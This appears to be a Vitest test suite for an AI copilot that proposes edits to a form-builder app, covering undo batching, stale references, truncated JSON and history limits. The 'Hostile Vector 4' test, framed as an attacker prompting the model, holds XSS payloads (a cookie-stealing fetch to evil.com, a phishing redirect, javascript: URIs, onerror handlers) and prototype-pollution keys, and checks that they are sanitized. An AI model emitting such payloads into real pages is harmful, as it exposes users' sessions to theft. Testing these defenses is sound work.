import { describe, it, expect, vi } from 'vitest';
import {
  createFormStudioStore,
  type StudioState,
  type StudioAction,
} from '../src/studio/index.js';
import {
  AiStudioCopilotDispatcher,
  type AiToolActionProposal,
} from '../src/ai/StudioAiCopilotDispatcher.js';

describe('Hostile Operationalization: AI Copilot & Chat Studio Integration', () => {
  it('Hostile Vector 1: Transactional Batching & Single-Step Undo Conservation (Preventing 50-State History Flood)', () => {
    // History is bounded to 15 entries on mobile devices to prevent heap starvation
    const store = createFormStudioStore(undefined, 15);
    const initialPageId = store.getState().activePageId;

    // Simulate an AI Copilot synthesizing a complex multi-step intake flow:
    // 1 page addition, 3 field insertions, 1 jump rule, 1 settings update
    const aiProposal: AiToolActionProposal = {
      id: 'ai-proposal-1',
      rationale: 'Generated multi-step loan intake flow with branching',
      actions: [
        {
          type: 'ADD_PAGE',
          payload: { title: 'Employment & Income', description: 'Step 2' },
        },
        {
          type: 'INSERT_FIELD',
          payload: {
            pageId: initialPageId,
            index: 0,
            field: {
              id: 'f-annual-salary',
              name: 'annual_salary',
              type: 'number',
              label: 'Gross Annual Salary ($)',
              required: true,
            },
          },
        },
        {
          type: 'INSERT_FIELD',
          payload: {
            pageId: initialPageId,
            index: 1,
            field: {
              id: 'f-employment-status',
              name: 'employment_status',
              type: 'select',
              label: 'Employment Status',
              options: [
                { label: 'Full-time', value: 'full_time' },
                { label: 'Self-employed', value: 'self_employed' },
              ],
            },
          },
        },
        {
          type: 'UPDATE_FORM_METADATA',
          payload: {
            title: 'Verified Mortgage Application',
            themeColor: '#0ea5e9',
          },
        },
      ],
    };

    // Baseline assertions
    expect(store.getState().history.past).toHaveLength(0);
    expect(store.getState().schema.pages).toHaveLength(1);

    // Hostile Dispatch: Dispatch the AI proposal atomically
    const dispatchResult = AiStudioCopilotDispatcher.applyProposal(store, aiProposal);
    expect(dispatchResult.success).toBe(true);

    const postState = store.getState();
    // 1. All changes were applied
    expect(postState.schema.title).toBe('Verified Mortgage Application');
    expect(postState.schema.pages).toHaveLength(2);
    expect(postState.schema.pages[0]!.fields).toHaveLength(2);

    // 2. CRITICAL INVARIANT: History must contain EXACTLY 1 snapshot, NOT 4!
    // This preserves user undo capacity and prevents mobile memory starvation.
    expect(postState.history.past).toHaveLength(1);

    // 3. Single-Click Undo: A single undo reverts ALL 4 AI mutations back to the clean baseline
    store.dispatch({ type: 'UNDO' });
    const revertedState = store.getState();

    expect(revertedState.schema.title).toBe('Untitled Form');
    expect(revertedState.schema.pages).toHaveLength(1);
    expect(revertedState.schema.pages[0]!.fields).toHaveLength(0);
    expect(revertedState.history.past).toHaveLength(0);
    expect(store.canUndo()).toBe(false);
  });

  it('Hostile Vector 2: Stale Target & Orphaned Reference Defense (Concurrency Race)', () => {
    const store = createFormStudioStore();
    const p1 = store.getState().activePageId;

    // Add a second page
    store.dispatch({ type: 'ADD_PAGE', payload: { title: 'Step 2' } });
    const p2 = store.getState().schema.pages[1]!.id;

    // Concurrency Race Simulation:
    // The user deletes Page 2 while the LLM was thinking about adding fields to Page 2
    store.dispatch({ type: 'REMOVE_PAGE', payload: { pageId: p2 } });
    expect(store.getState().schema.pages.some((p) => p.id === p2)).toBe(false);

    // The AI's delayed proposal arrives, attempting to insert a field into the now-deleted page 'p2'
    // and setting a jump rule targeting non-existent 'p2'
    const staleProposal: AiToolActionProposal = {
      id: 'stale-ai-proposal',
      rationale: 'Adding fields to Step 2',
      actions: [
        {
          type: 'INSERT_FIELD',
          payload: {
            pageId: p2, // DELETED TARGET!
            index: 0,
            field: {
              id: 'f-stale',
              name: 'stale_field',
              type: 'text',
              label: 'Orphaned Field',
            },
          },
        },
        {
          type: 'ADD_JUMP_RULE',
          payload: {
            pageId: p1,
            rule: {
              id: 'rule-to-deleted',
              targetPageId: p2, // DELETED TARGET!
              conditions: [{ field: 'q1', operator: 'equals', value: 'yes' }],
            },
          },
        },
        {
          type: 'INSERT_FIELD',
          payload: {
            pageId: p1, // Valid target
            index: 0,
            field: {
              id: 'f-valid',
              name: 'valid_field',
              type: 'text',
              label: 'Valid Question',
            },
          },
        },
      ],
    };

    // Pre-flight validation must detect stale targets without throwing an unhandled exception
    const preflight = AiStudioCopilotDispatcher.validateProposal(store.getState(), staleProposal);
    expect(preflight.hasStaleReferences).toBe(true);
    expect(preflight.rejectedActions).toHaveLength(2); // The insert into p2 and jump to p2
    expect(preflight.admissibleActions).toHaveLength(1); // The valid insert into p1

    // Apply with prune-stale policy
    const result = AiStudioCopilotDispatcher.applyProposal(store, staleProposal, {
      staleTargetPolicy: 'prune-and-continue',
    });

    expect(result.success).toBe(true);
    expect(result.appliedCount).toBe(1);
    expect(result.prunedCount).toBe(2);

    // Ensure state integrity: p1 got the valid field, and no dangling references were created
    const finalState = store.getState();
    expect(finalState.schema.pages[0]!.fields).toHaveLength(1);
    expect(finalState.schema.pages[0]!.fields[0]!.name).toBe('valid_field');
    expect(finalState.schema.pages[0]!.jumpRules || []).toHaveLength(0);
  });

  it('Hostile Vector 3: Mid-Stream JSON Truncation & Partial Tool Ingestion Resilience', () => {
    // Simulating token limit cutoff mid-stream from LLM:
    const truncatedPayloads = [
      '{"name": "salary", "type": "number", "rules": [{"type": "min"', // cut off inside array
      '{"id": "f_1", "type": "select", "options": [{"label": "Yes"', // missing closing brackets
      '{', // single opening brace
      'NOT JSON AT ALL', // random plain text failure
    ];

    for (const raw of truncatedPayloads) {
      const parsed = AiStudioCopilotDispatcher.parseRawToolCall(raw);
      expect(parsed.success).toBe(false);
      expect(parsed.action).toBeNull();
      expect(parsed.error).toBeDefined();
    }

    // Heals salvageable JSON with missing trailing braces
    const salvageable = '{"pageId": "p1", "field": {"name": "first_name", "type": "text", "label": "First Name"}';
    const healedResult = AiStudioCopilotDispatcher.parseRawToolCall(salvageable);
    expect(healedResult.success).toBe(true);
    expect(healedResult.action).toBeDefined();
    expect(healedResult.action?.type).toBe('INSERT_FIELD');
  });

  it('Hostile Vector 4: Prompt Injection & Covert Field Exfiltration Defense', () => {
    const store = createFormStudioStore();
    const p1 = store.getState().activePageId;

    // Attacker prompts LLM to generate malicious payload
    const maliciousProposal: AiToolActionProposal = {
      id: 'malicious-ai-proposal',
      rationale: 'Injection test',
      actions: [
        {
          type: 'INSERT_FIELD',
          payload: {
            pageId: p1,
            index: 0,
            field: {
              id: 'f-exploit',
              name: '__proto__', // Prototype pollution vector
              type: 'text',
              label: 'Input <script>fetch("https://evil.com/leak?cookie=" + document.cookie)</script>',
              helperText: '<iframe src="javascript:alert(1)"></iframe>Click here',
              options: [
                { label: 'Option <img src=x onerror=alert(2)>', value: 'constructor' },
              ],
            },
          },
        },
        {
          type: 'UPDATE_FORM_METADATA',
          payload: {
            title: 'Secure Form <script>window.location="https://phishing.com"</script>',
            coverImage: 'javascript:alert("xss")',
          },
        },
      ],
    };

    // Apply with mandatory sanitization
    const result = AiStudioCopilotDispatcher.applyProposal(store, maliciousProposal);
    expect(result.success).toBe(true);

    const state = store.getState();
    const field = state.schema.pages[0]!.fields[0]!;

    // Invariants:
    // 1. Prototype pollution keys neutralized
    expect(field.name).not.toBe('__proto__');
    expect(field.name).toMatch(/^field___proto__/);
    expect((Object.prototype as any).polluted).toBeUndefined();

    // 2. Dangerous HTML/script tags stripped from label and helperText
    expect(field.label).not.toContain('<script>');
    expect(field.label).not.toContain('fetch(');
    expect(field.helperText).not.toContain('<iframe');
    expect(field.helperText).not.toContain('javascript:');

    // 3. Option labels and values sanitized
    expect(field.options![0]!.label).not.toContain('<img');
    expect(field.options![0]!.label).not.toContain('onerror');
    expect(field.options![0]!.value).not.toBe('constructor');

    // 4. Form metadata coverImage pseudo-protocol neutralized
    expect(state.schema.title).not.toContain('<script>');
    expect(state.schema.coverImage).toBeUndefined(); // Rejected dangerous scheme
  });

  it('Hostile Vector 5: Auto-Salvage with Prune-and-Continue & Structured Diagnostic Reflection', () => {
    const store = createFormStudioStore();
    const validPageId = store.getState().activePageId;
    const ghostPageId = 'deleted-page-999';

    // Agent proposes 3 actions: 2 valid, 1 targeting an orphaned/ghost page
    const mixedProposal: AiToolActionProposal = {
      id: 'mixed-proposal-salvage',
      rationale: 'Adding profile fields with one stale reference',
      actions: [
        {
          type: 'INSERT_FIELD',
          payload: {
            pageId: validPageId,
            index: 0,
            field: { id: 'f-valid-1', name: 'valid_field_1', type: 'text', label: 'Valid Field 1' },
          },
        },
        {
          type: 'INSERT_FIELD',
          payload: {
            pageId: ghostPageId, // STALE REFERENCE
            index: 0,
            field: { id: 'f-stale', name: 'stale_field', type: 'text', label: 'Stale Field' },
          },
        },
        {
          type: 'INSERT_FIELD',
          payload: {
            pageId: validPageId,
            index: 1,
            field: { id: 'f-valid-2', name: 'valid_field_2', type: 'text', label: 'Valid Field 2' },
          },
        },
      ],
    };

    // Apply with 'prune-and-continue'
    const result = AiStudioCopilotDispatcher.applyProposal(store, mixedProposal, {
      staleTargetPolicy: 'prune-and-continue',
    });

    expect(result.success).toBe(true);
    expect(result.appliedCount).toBe(2);
    expect(result.prunedCount).toBe(1);
    expect(result.prunedDetails).toHaveLength(1);
    expect(result.prunedDetails![0]?.reason).toContain('Target pageId "deleted-page-999" does not exist');

    // Both valid fields are present in schema
    const pageFields = store.getState().schema.pages[0]!.fields;
    expect(pageFields.map((f) => f.id)).toEqual(['f-valid-1', 'f-valid-2']);

    // Invariant: Exactly ONE undo frame was created for the partial batch
    expect(store.getState().history.past).toHaveLength(1);

    // Undo cleanly reverts both applied fields
    store.dispatch({ type: 'UNDO' });
    expect(store.getState().schema.pages[0]!.fields).toHaveLength(0);
  });

  it('Hostile Vector 6: Platform-Aware Memory Bounds (Mobile 15 vs. Web 50 History Depth)', () => {
    // 1. Mobile store should clamp past history to 15 entries
    const mobileStore = createFormStudioStore(undefined, 'mobile');
    expect(mobileStore.getState().history.maxDepth).toBe(15);

    for (let i = 0; i < 25; i++) {
      mobileStore.dispatch({
        type: 'UPDATE_FORM_METADATA',
        payload: { title: `Mobile Iteration ${i}` },
      });
    }
    expect(mobileStore.getState().history.past.length).toBe(15);

    // 2. Web store should permit 50 entries
    const webStore = createFormStudioStore(undefined, 'web');
    expect(webStore.getState().history.maxDepth).toBe(50);

    for (let i = 0; i < 45; i++) {
      webStore.dispatch({
        type: 'UPDATE_FORM_METADATA',
        payload: { title: `Web Iteration ${i}` },
      });
    }
    expect(webStore.getState().history.past.length).toBe(45);
  });
});
